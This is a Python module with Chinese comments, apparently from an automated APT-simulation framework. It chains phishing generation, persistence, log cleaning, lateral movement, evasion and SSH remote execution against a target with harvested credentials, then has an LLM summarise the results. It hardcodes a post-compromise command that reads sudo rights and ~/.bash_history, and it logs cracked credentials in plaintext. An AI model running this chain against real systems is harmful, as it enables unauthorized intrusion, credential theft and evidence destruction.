# _get_called_tools removed — auto toolchain eliminated LLM tool loop


def _auto_execute_phase_tools(phase: AptPhase, state: AptSimulationState) -> dict[str, Any]:
    """全自动执行当前阶段所有工具，LLM 仅做结果分析，不参与工具循环"""
    safe_print(f"  [自动执行] {PHASE_LABELS.get(phase, phase.value)} 阶段全部工具")

    primary = state.targets[0]
    host = primary.host
    creds = state.notes.get("credentials", {})
    has_creds = bool(creds and creds.get("username") and creds.get("password"))

    # ── RECON / INITIAL_ACCESS 已有专用函数 ──
    if phase == AptPhase.RECON:
        return _auto_recon(host)
    if phase == AptPhase.INITIAL_ACCESS:
        return _auto_initial_access(host, state)

    results: dict[str, Any] = {}
    tool_list = PHASE_TOOLS[phase]

    # ── 构造跨工具共享的上下文 ──
    cross_t = state.targets[1] if len(state.targets) > 1 else None
    state_snapshot: dict[str, Any] = {
        "target": host,
        "vector": state.current_vector,
        "blue_team_awareness": state.blue_team_awareness,
        "compromised": primary.compromised,
        "access_level": primary.access_level,
        "has_credentials": has_creds,
        "credentials": {"username": creds.get("username", ""), "password": creds.get("password", "")} if has_creds else {},
        "compromised_targets": [t.host for t in state.targets if t.compromised],
        "phase_results": [
            {"phase": r.phase.value, "status": r.status, "summary": r.summary,
             "findings": r.findings}
            for r in state.phase_results.values()
        ],
    }
    if cross_t:
        state_snapshot["cross_target"] = {"host": cross_t.host, "id": cross_t.id}

    # ── 工具名 → (参数名, 参数值) 映射 ──
    _TOOL_PARAMS: dict[str, tuple[str, dict]] = {
        # SOCIAL_ENG
        "se_phishing_gen": ("context", {
            "target": host, "organization": "", "phase_results": state_snapshot["phase_results"],
            "compromised": primary.compromised, "blue_team_awareness": state.blue_team_awareness,
        }),
        "se_conversation_gen": ("context", {
            "target": host, "organization": "", "phase_results": state_snapshot["phase_results"],
        }),
        # PERSISTENCE
        "apt_persistence_plan": ("target_info", state_snapshot),
        "apt_log_clean": ("target_info", state_snapshot),
        # LATERAL (无 credential_attack 防止 SSH 爆破)
        "apt_lateral_plan": ("state", state_snapshot),
        "apt_privilege_plan": ("state", state_snapshot),
        # CROSS_TARGET
        "apt_cross_plan": ("state", state_snapshot),
        "apt_evasion_plan": ("state", state_snapshot),
        # REPORT
        "apt_report_gen": ("state", state_snapshot),
    }

    # ── 执行所有本阶段工具 ──
    for tool_name in tool_list:
        _params: dict[str, Any] = {"target": host}
        if tool_name in _TOOL_PARAMS:
            _param_name, _param_val = _TOOL_PARAMS[tool_name]
            _params = {_param_name: _param_val}
        elif tool_name in ("apt_tunnel_establish", "apt_remote_exec", "apt_port_forward"):
            if not has_creds:
                results[tool_name] = {"skipped": True, "reason": "无有效 SSH 凭证"}
                continue
            _params = {
                "host": host,
                "username": creds.get("username", ""),
                "password": creds.get("password", ""),
            }
            # Auto-populate reconnaissance command for apt_remote_exec
            if tool_name == "apt_remote_exec":
                _params["command"] = "id; echo '===UNAME==='; uname -a; echo '===SUDO==='; echo '' | sudo -S -l 2>&1 || true; echo '===HOME==='; ls -la ~ 2>/dev/null; echo '===HISTORY==='; cat ~/.bash_history 2>/dev/null | tail -20; echo '===NET==='; ip addr 2>/dev/null || ifconfig 2>/dev/null"
            # Auto-populate targets from harvested data for apt_port_forward
            if tool_name == "apt_port_forward":
                harvested = state.notes.get("post_exploit", {}).get("harvested", {})
                if harvested.get("hosts"):
                    _params["remote_host"] = harvested["hosts"][0]
                    _params["remote_port"] = 80
                else:
                    _params["remote_host"] = ""
                    _params["remote_port"] = 0

        safe_print(f"  [{tool_name}] 执行中...")
        _start = _time.monotonic()
        try:
            _r = run_local_tool(tool_name, _params)
            results[tool_name] = _r
            safe_print(f"  [{tool_name}] 完成 ({_time.monotonic()-_start:.0f}s)")
        except Exception as _exc:
            results[tool_name] = {"error": str(_exc)[:300]}
            safe_print(f"  [{tool_name}] 错误: {_exc}")

    results["findings"] = _collect_findings(results)
    return results


def _collect_findings(results: dict[str, Any]) -> list[str]:
    """从工具结果中提取发现摘要"""
    findings: list[str] = []
    for _k, _v in results.items():
        if isinstance(_v, dict):
            for _field in ("findings", "critical_findings", "warning", "summary"):
                _val = _v.get(_field, "")
                if isinstance(_val, str) and _val:
                    findings.append(f"[{_k}] {_val}")
                elif isinstance(_val, list):
                    findings.extend(f"[{_k}] {_x}" for _x in _val if isinstance(_x, str))
    return findings


def _msg_to_dict(msg: Any) -> dict:
    """将 Message 对象转为可序列化 dict（OpenAI 兼容格式）"""
    entry: dict = {"role": _msg_role(msg), "content": _msg_content(msg)}
    fc = _get_func_call(msg)
    if fc:
        entry["function_call"] = fc
    name = _msg_name(msg)
    if name:
        entry["name"] = name
    return entry


def _summarize_auto_results(raw: dict[str, Any], max_str_len: int = 300) -> dict[str, Any]:
    """压缩自动工具执行结果为 LLM 友好的摘要，截断大文本"""
    summary: dict[str, Any] = {}

    # 保留关键标量
    for key in ("compromised", "access_level", "credentials", "known_usernames", "password_hints"):
        if key in raw:
            summary[key] = raw[key]

    # 保留 findings
    if raw.get("findings"):
        summary["findings"] = list(raw["findings"])

    # 保留 scan_result 摘要
    if raw.get("scan_result"):
        _sr = raw["scan_result"]
        if isinstance(_sr, dict):
            summary["scan_result"] = {k: _sr[k] for k in ("services", "scan_duration", "target", "open_ports") if k in _sr}

    # 保留 open_ports 和 categories
    for key in ("open_ports", "categories"):
        if key in raw:
            summary[key] = raw[key]

    # 通用的 HTTP 结果摘要（适配 http_attacks 和 http_results）
    def _summarize_http_entry(_hv: dict[str, Any]) -> dict[str, Any]:
        if not isinstance(_hv, dict):
            return {"_value": str(_hv)[:max_str_len]}
        _entry: dict[str, Any] = {}
        for _keep in ("status", "success", "error", "successes", "valid_codenames",
                      "anomalies", "total_requests", "cracked_count",
                      "attempts", "duration", "method", "auth_mode",
                      "path", "port", "status_code", "content_length", "headers"):
            if _keep in _hv:
                _entry[_keep] = _hv[_keep]
        # 截断大文本字段
        for _big in ("body", "content", "body_preview", "response", "raw", "html", "data"):
            if _big in _hv and isinstance(_hv[_big], str):
                _v = _hv[_big]
                _entry[_big] = _v[:max_str_len] + ("..." if len(_v) > max_str_len else "")
                break  # only keep one body variant
        if not _entry:
            _entry["_summary"] = f"{type(_hv).__name__}({len(_hv)} fields)"
        return _entry

    for _http_key in ("http_attacks", "http_results"):
        if raw.get(_http_key):
            _sm: dict[str, Any] = {}
            for _hk, _hv in raw[_http_key].items():
                _sm[_hk] = _summarize_http_entry(_hv)
            summary[_http_key] = _sm

    # smb_results 摘要
    if raw.get("smb_results"):
        _smb_sm: dict[str, Any] = {}
        for _sk, _sv in raw["smb_results"].items():
            if not isinstance(_sv, dict):
                _smb_sm[_sk] = _sv
                continue
            _entry: dict[str, Any] = {}
            for _keep in ("shares", "share_list", "success", "error", "service", "port"):
                if _keep in _sv:
                    _entry[_keep] = _sv[_keep]
            # 截断 files/findings 列表
            for _list_key in ("files", "findings", "content"):
                if _list_key in _sv and isinstance(_sv[_list_key], list):
                    _entry[_list_key] = _sv[_list_key][:5]
            if not _entry:
                _entry["_summary"] = f"dict({len(_sv)} fields)"
            _smb_sm[_sk] = _entry
        summary["smb_results"] = _smb_sm

    # cracked_hashes: 只保留摘要
    if raw.get("cracked_hashes"):
        _ch = raw["cracked_hashes"]
        if isinstance(_ch, dict):
            summary["cracked_hashes"] = {
                "total": len(_ch.get("cracked", [])),
                "cracked": [c.get("password", "?") for c in _ch.get("cracked", []) if isinstance(c, dict)],
            }

    # post_exploit: 精简
    if raw.get("post_exploit"):
        _pe = raw["post_exploit"]
        if isinstance(_pe, dict):
            _pe_sm: dict[str, Any] = {}
            for _keep in ("findings", "credentials", "access_level", "verified_services",
                          "harvested", "ssh_results", "smb_results", "access_level"):
                if _keep in _pe:
                    _pe_sm[_keep] = _pe[_keep]
            # 也截断 post_exploit 内的大文本
            for _pe_key in list(_pe_sm.keys()):
                _pe_val = _pe_sm[_pe_key]
                if isinstance(_pe_val, str) and len(_pe_val) > max_str_len:
                    _pe_sm[_pe_key] = _pe_val[:max_str_len] + "..."
            summary["post_exploit"] = _pe_sm

    # 通用工具结果 (PERSISTENCE/LATERAL 等): 只保留摘要字段
    for _key in raw:
        if _key in ("findings", "http_attacks", "http_results", "smb_results",
                     "cracked_hashes", "post_exploit",
                     "known_usernames", "password_hints", "credentials", "access_level",
                     "compromised", "open_ports", "categories", "scan_result"):
            continue
        _val = raw[_key]
        if isinstance(_val, dict):
            _entry: dict[str, Any] = {}
            for _keep in ("skipped", "reason", "error", "summary", "success",
                          "output", "exit_code", "findings", "compromised",
                          "username", "host", "port", "service"):
                if _keep in _val:
                    _entry[_keep] = _val[_keep]
            if _val.get("skipped"):
                _entry["skipped"] = True
                _entry["reason"] = _val.get("reason", "")
            if not _entry:
                _entry["_summary"] = f"dict({len(_val)} fields)"
            summary[_key] = _entry
        elif isinstance(_val, (list, tuple)):
            summary[_key] = list(_val)[:10]
        else:
            summary[_key] = _val

    return summary


def _execute_phase(
    state: AptSimulationState,
    phase: AptPhase,
    assistant_factory: Callable[[str, list[str]], Any] | None = None,
) -> dict[str, Any]:
    """执行单个阶段（支持遗漏工具自动重试），单阶段超时 300s"""
    from .agentic import SecurityAgentError, _collect_final_assistant_text, _extract_json_payload
    import concurrent.futures as _cf

    phase_context = build_phase_context(state, phase)
    system_prompt = PHASE_SYSTEM_PROMPTS[phase]
    tools = PHASE_TOOLS[phase]

    # 构造 user prompt
    primary = state.targets[0]

    # 在每个 phase 的 system prompt 末尾注入目标 IP，防止模型幻觉
    system_prompt = f"{system_prompt}\n\n【你的目标 IP 是 {primary.host}。所有工具调用的 target/host 参数必须填这个 IP，不要扫描其他 IP。】"
    cross_target = state.targets[1] if len(state.targets) > 1 else None
    target_info: dict[str, Any] = {
        "target": primary.host,
        "vector": state.current_vector,
        "phase": phase.value,
        "blue_team_awareness": state.blue_team_awareness,
        "phase_results": [
            {"phase": r.phase.value, "status": r.status, "summary": r.summary, "findings": r.findings}
            for r in state.phase_results.values()
        ],
    }
    if cross_target:
        target_info["cross_target"] = {
            "host": cross_target.host,
            "id": cross_target.id,
            "compromised": cross_target.compromised,
            "access_level": cross_target.access_level,
        }
        target_info["via_target"] = primary.host

    prompt_parts = [
        phase_context,
        "",
        "### 目标信息（JSON）",
        json.dumps(target_info, ensure_ascii=False, indent=2),
        "",
        "请按 System Prompt 中的指引执行本阶段任务，输出严格 JSON 格式。",
    ]

    checklist = _build_tool_checklist(phase, target_info)
    if checklist:
        prompt_parts.append("")
        prompt_parts.append(checklist)

    user_prompt = "\n".join(prompt_parts)

    # ── 所有阶段统一自动工具链执行（无 LLM 循环）──
    auto_results = _auto_execute_phase_tools(phase, state)
    auto_summary = _summarize_auto_results(auto_results)
    user_prompt += (
        "\n\n### 自动工具执行结果（全部工具已执行完毕，无需再调工具）\n"
        + json.dumps(_to_jsonable(auto_summary), ensure_ascii=False, indent=2)
    )
    tools: list[str] = []  # LLM 只需分析结果，不参与工具循环

    model = PHASE_MODELS[phase]
    if assistant_factory:
        assistant = assistant_factory(system_prompt, tools)
    else:
        llm_cfg = build_qwen_llm_config(model=model, mode="apt")
        assistant = create_qwen_security_assistant(
            system_message=system_prompt,
            mode="apt",
            function_list=tools,
            llm_cfg=llm_cfg,
        )

    # ── 单次 LLM 调用分析结果（300s 超时）──
    messages = [{"role": "user", "content": user_prompt}]

    _executor = _cf.ThreadPoolExecutor(max_workers=1)
    _future = _executor.submit(assistant.run_nonstream, messages)
    try:
        responses = _future.result(timeout=300)
    except _cf.TimeoutError:
        safe_print(f"  [TIMEOUT] 阶段 {PHASE_LABELS.get(phase, phase.value)} 执行超时 (300s)")
        return {"summary": "阶段执行超时", "findings": auto_results.get("findings", []), "blue_team_awareness_delta": 0}
    finally:
        _executor.shutdown(wait=False)

    final_text = _collect_final_assistant_text(responses)

    # ── 从 LLM 输出中提取 JSON ──
    _result: dict[str, Any] = {}
    try:
        _result = _extract_json_payload(final_text)
    except SecurityAgentError:
        pass

    if not _result:
        # ── JSON 恢复重试（1 次，无工具强制输出）──
        summary_context = final_text[:800] if final_text else "(无前文)"
        _no_tool_asst = create_qwen_security_assistant(
            system_message=system_prompt, mode="apt",
            function_list=[], llm_cfg=build_qwen_llm_config(model=model, mode="apt"),
        )
        retry_msgs = [{"role": "user", "content": (
            f"你之前执行了工具调用。以下是你最后的输出：\n---\n{summary_context}\n---\n"
            f"请基于工具执行结果输出严格的 JSON 摘要，不要调用工具。"
        )}]
        try:
            responses = _no_tool_asst.run_nonstream(retry_msgs)
            final_text = _collect_final_assistant_text(responses)
            _result = _extract_json_payload(final_text)
        except SecurityAgentError:
            _result = {"summary": final_text[:500] if final_text else "无输出",
                       "findings": auto_results.get("findings", []),
                       "blue_team_awareness_delta": 0}

    # ── 凭证兜底注入：auto tools 找到了但 LLM 没输出的情况 ──
    if not _result.get("credentials"):
        _creds_from_notes = state.notes.get("credentials")
        if _creds_from_notes and _creds_from_notes.get("username") and _creds_from_notes.get("password"):
            _result["credentials"] = _creds_from_notes
            safe_print(f"  [cred-inject] 从 state.notes 注入凭证: {_creds_from_notes['username']}:{_creds_from_notes['password']}")
        else:
            # 从 auto_results 中查找
            _auto_creds = auto_results.get("credentials") or {}
            if _auto_creds and _auto_creds.get("username") and _auto_creds.get("password"):
                _result["credentials"] = _auto_creds
                safe_print(f"  [cred-inject] 从 auto_results 注入凭证: {_auto_creds['username']}:{_auto_creds['password']}")
            _pe = auto_results.get("post_exploit", {})
            if isinstance(_pe, dict) and _pe.get("credentials") and not _result.get("credentials"):
                _result["credentials"] = _pe["credentials"]
                safe_print(f"  [cred-inject] 从 post_exploit 注入凭证")

    if _result.get("credentials"):
        _result["compromised"] = True

    return _result
